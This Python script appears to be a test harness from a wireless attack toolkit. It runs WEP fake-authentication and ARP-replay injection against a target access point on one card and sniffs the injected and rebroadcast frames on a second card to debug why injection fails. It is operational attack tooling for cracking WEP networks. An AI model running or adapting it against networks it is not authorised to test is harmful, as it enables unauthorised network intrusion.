"""Dual-NIC WEP-replay sniff: one card runs fake-auth + ARP replay, the other
sniffs ch6 and logs the on-air bytes. Run it BOTH ways and diff:

    uv run python scripts/test_dual_nic_wep.py --bssid AA:BB:CC:DD:EE:FF --tx 5592
    uv run python scripts/test_dual_nic_wep.py --bssid AA:BB:CC:DD:EE:FF --tx 8821

`--tx 5592` makes the PAU09 (RT5572) the attacker and the 8821au the sniffer;
`--tx 8821` swaps the roles. The sniffer is a passive monitor — it sees the
ACTUAL on-air frames (post-hardware), so it settles the three open questions
the IV counts could not:

  * our replays on-air      → does the attacker's TX actually emit (vs ok=1)?
  * our replays byte-intact → is the encrypted body unchanged on-air (vs the
                              chip re-encrypting/garbling it)?
  * AP rebroadcasts         → does the AP accept + rebroadcast our replay?

Decision matrix (compare the two runs):
  replays on-air ~0                     → TX_STA_FIFO lies; RF dead for data.
  replays on-air, AP rebroadcasts ~0    → AP rejects our TX. Diff the on-air
                                          replay hex (5592 vs 8821) to see why.
  replays on-air, AP rebroadcasts many  → attacker's RX is the problem (it
                                          can't hear what the sniffer can).

Needs a client (your phone) generating WEP traffic on the target so the
attacker can capture an ARP seed to replay. Connect it before/at start.
"""
import argparse
import asyncio
import logging
import sys
import time
from pathlib import Path

sys.path.append(str(Path(__file__).parent.parent / "src"))

# Windows consoles (and redirected files) default to cp1252, which can't encode
# arrows/em-dashes from this script or from driver log lines. Force UTF-8.
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from wifit3.wlan.manager import WlanDeviceManager
from wifit3.models import AccessPoint
from wifit3.campaigns.wep.fake_auth import WepFakeAuth
from wifit3.campaigns.wep.arp_replay import WepArpReplay

BROADCAST = b"\xff\xff\xff\xff\xff\xff"

# Role tokens → substrings to match against a card's description.
TX_ALIASES = {
    "5592": ("5572", "5592", "pau09", "ralink"),
    "8821": ("8821",),
}


def mac_bytes(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def fmt_mac(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def pick(interfaces, tokens):
    for iface in interfaces:
        desc = (iface.description or "").lower()
        if any(t in desc for t in tokens):
            return iface
    return None


class WepSniffer:
    """Classifies + tallies on-air WEP frames the sniffer hears, keyed to the
    target BSSID and our attacker's source MAC. Keeps a few raw-hex samples of
    each category so we can diff the actual bytes between the two runs."""

    def __init__(self, bssid: str, our_mac_hex_box: list):
        self.bssid = mac_bytes(bssid)
        # our attacker MAC is generated after we build fake-auth; read it live.
        self._our_box = our_mac_hex_box
        self.total = 0
        self.beacons = 0          # from target BSSID — sniffer-alive + channel
        self.our_replays = 0      # ToDS WEP bcast from OUR mac (what we inject)
        self.other_tods = 0       # ToDS WEP bcast from someone else (the phone)
        self.ap_rebroadcasts = 0  # FromDS WEP bcast from the AP (the payoff)
        self.our_samples: list[str] = []
        self.ap_samples: list[str] = []

    def __call__(self, frame: bytes, rssi: int, ts: float) -> None:
        if len(frame) < 24:
            return
        self.total += 1
        fc0, fc1 = frame[0], frame[1]
        ftype = (fc0 & 0x0C) >> 2
        subtype = (fc0 & 0xF0) >> 4
        to_ds = bool(fc1 & 0x01)
        from_ds = bool(fc1 & 0x02)
        protected = bool(fc1 & 0x40)
        a1, a2, a3 = frame[4:10], frame[10:16], frame[16:22]

        if ftype == 0 and subtype == 8 and a3 == self.bssid:
            self.beacons += 1
            return
        if ftype != 2 or not protected:          # only protected DATA matters
            return

        our_mac = self._our_box[0]
        if to_ds and not from_ds and a1 == self.bssid and a3 == BROADCAST:
            # client→AP broadcast (ARP-shaped). Ours iff sourced from our MAC.
            if our_mac is not None and a2 == our_mac:
                self.our_replays += 1
                if len(self.our_samples) < 6:
                    self.our_samples.append(frame.hex())
            else:
                self.other_tods += 1
        elif from_ds and not to_ds and a1 == BROADCAST and a2 == self.bssid:
            # AP→broadcast rebroadcast — the thing that mints fresh IVs.
            self.ap_rebroadcasts += 1
            if len(self.ap_samples) < 6:
                self.ap_samples.append(frame.hex())

    def snapshot(self) -> tuple:
        return (self.total, self.beacons, self.our_replays,
                self.other_tods, self.ap_rebroadcasts)


async def _always() -> bool:
    return True


async def main(args) -> None:
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s %(levelname)-5s %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    bssid = args.bssid.lower()
    tx_tokens = TX_ALIASES[args.tx]

    print(f"[*] Target BSSID {bssid} ch{args.channel}; TX card = {args.tx}")
    manager = WlanDeviceManager()
    interfaces = await manager.refresh()
    if len(interfaces) < 2:
        print(f"[-] Need 2 cards, found {len(interfaces)}:")
        for i in interfaces:
            print(f"      - {i.name} ({i.description})")
        return

    tx = pick(interfaces, tx_tokens)
    snf = next((i for i in interfaces if i is not tx), None)
    if tx is None or snf is None:
        print("[-] Could not assign TX/sniffer roles. Found:")
        for i in interfaces:
            print(f"      - {i.name} ({i.description})")
        return
    print(f"[+] TX/attacker: {tx.name} ({tx.description})")
    print(f"[+] Sniffer:     {snf.name} ({snf.description})")

    print("[*] Connecting both...")
    tx_ok, snf_ok = await asyncio.gather(tx.connect(), snf.connect())
    if not (tx_ok and snf_ok):
        print(f"[-] connect failed (tx={tx_ok} sniffer={snf_ok}).")
        return
    await asyncio.gather(tx.set_channel(args.channel), snf.set_channel(args.channel))

    # Sniffer logs from now on (catches beacons + the phone's ARPs while we wait).
    our_mac_box = [None]
    sniffer = WepSniffer(bssid, our_mac_box)
    snf.register_rx_callback(sniffer)

    print(f"[*] Waiting up to {args.warmup}s for the attacker to see the AP "
          "beacon (-> WEP) and capture an ARP seed.")
    print("    >>> Make sure a client (your phone) is generating traffic now <<<")
    target = None
    deadline = time.time() + args.warmup
    while time.time() < deadline:
        ap = tx.access_points.get(bssid)
        seeds = tx.wep_store.arp_candidate_count(bssid)
        enc = (ap.encryption if ap else "?")
        print(f"    AP seen={ap is not None} enc={enc} arp_seeds={seeds} "
              f"| sniffer total={sniffer.total} beacons={sniffer.beacons}")
        if ap is not None and (ap.encryption or "").upper() == "WEP" and seeds > 0:
            target = ap
            break
        await asyncio.sleep(2)

    if target is None:
        print("[-] No WEP AP + ARP seed captured in time. Is the BSSID right, "
              "the card on ch6, and a client generating WEP traffic?")
        await asyncio.gather(tx.close(), snf.close())
        return
    print(f"[+] Target ready: ssid={target.ssid!r} enc={target.encryption} "
          f"seeds={tx.wep_store.arp_candidate_count(bssid)}")

    # Wire fake-auth + replay exactly as WepCampaign does (no cracker).
    fake_auth = WepFakeAuth(tx, target, log_callback=lambda m: None)
    replay = WepArpReplay(
        tx, target, tx.wep_store,
        source_mac=fake_auth.source_mac,
        ensure_associated=fake_auth.ensure_associated,
        request_reauth=fake_auth.request_reauth,
        log_callback=lambda m: None,
    )
    our_mac_box[0] = fake_auth.source_mac
    print(f"[*] Attacker source MAC = {fmt_mac(fake_auth.source_mac)}")

    base = sniffer.snapshot()
    fake_auth.start()
    replay.start()
    print(f"[*] Replaying for {args.secs}s -- sampling the air each 5s...")
    t_end = time.time() + args.secs
    while time.time() < t_end:
        await asyncio.sleep(5)
        s = sniffer.snapshot()
        print(f"    t+{int(time.time()-(t_end-args.secs)):>2}s  "
              f"our_replays={s[2]-base[2]:<5} other_tods={s[3]-base[3]:<5} "
              f"AP_rebroadcasts={s[4]-base[4]:<5} "
              f"| injected={replay.stats.injected} "
              f"IVs={tx.wep_store.unique_count(bssid)}")

    replay.stop()
    fake_auth.stop()

    s = sniffer.snapshot()
    print("\n" + "=" * 64)
    print(f"  ROLE: TX={args.tx}  (attacker={tx.description})")
    print(f"  attacker injected:          {replay.stats.injected}")
    print(f"  attacker unique IVs gained: {tx.wep_store.unique_count(bssid)}")
    print(f"  sniffer total frames:       {s[0]-base[0]}")
    print(f"  sniffer target beacons:     {s[1]-base[1]}  (RX-alive sanity)")
    print(f"  --- on-air, post-hardware ---")
    print(f"  OUR replays on-air:         {s[2]-base[2]}")
    print(f"  other ToDS WEP bcast:       {s[3]-base[3]}  (phone's ARPs)")
    print(f"  AP rebroadcasts on-air:     {s[4]-base[4]}  (the payoff)")
    print("=" * 64)
    print("  OUR replay on-air samples (compare body across the two runs):")
    for i, h in enumerate(sniffer.our_samples):
        print(f"    our[{i}]: {h}")
    print("  AP rebroadcast on-air samples:")
    for i, h in enumerate(sniffer.ap_samples):
        print(f"    ap[{i}]:  {h}")
    print("=" * 64)

    await asyncio.gather(tx.close(), snf.close())
    print("[+] Done.")


def parse_args():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--bssid", required=True, help="Target WEP AP BSSID.")
    p.add_argument("--tx", choices=sorted(TX_ALIASES), required=True,
                   help="Which card attacks (TX); the other sniffs.")
    p.add_argument("--channel", type=int, default=6)
    p.add_argument("--warmup", type=int, default=30,
                   help="Seconds to wait for AP beacon + ARP seed (default 30).")
    p.add_argument("--secs", type=int, default=30,
                   help="Seconds to run the replay while sniffing (default 30).")
    p.add_argument("--debug", action="store_true")
    return p.parse_args()


if __name__ == "__main__":
    try:
        asyncio.run(main(parse_args()))
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[-] Test failed: {e}")
        import traceback
        traceback.print_exc()
